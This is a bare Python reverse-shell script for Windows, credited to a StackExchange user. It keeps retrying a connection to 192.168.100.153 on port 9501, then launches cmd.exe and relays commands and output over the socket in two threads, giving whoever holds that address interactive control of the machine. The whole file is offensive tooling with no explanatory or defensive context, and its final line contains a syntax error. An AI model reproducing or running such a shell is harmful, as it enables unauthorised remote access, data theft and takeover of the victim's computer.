#code by TR_SLimey on stackexchange
import os, socket, subprocess, threading, sys

def s2p(s, p):
    while True:p.stdin.write(s.recv(1024).decode()); p.stdin.flush()

def p2s(s, p):
    while True: s.send(p.stdout.read(1).encode())

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
while True:
    try: s.connect(('192.168.100.153', 9501)); break
    except: pass

p=subprocess.Popen(["cmd.exe"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True, text=True)

threading.Thread(target=s2p, args=[s,p], daemon=True).start()

threading.Thread(target=p2s, args=[s,p], daemon=True).start()

try: p.wait();except: s.close(); sys.exit(0)
